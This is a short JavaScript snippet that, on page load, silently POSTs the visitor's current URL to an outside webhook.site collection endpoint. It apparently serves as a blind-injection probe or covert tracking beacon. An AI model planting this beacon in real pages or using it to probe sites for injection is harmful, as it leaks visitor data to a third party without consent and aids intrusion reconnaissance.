window.onload = function() {
  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      url: window.location.href
    })
  });
};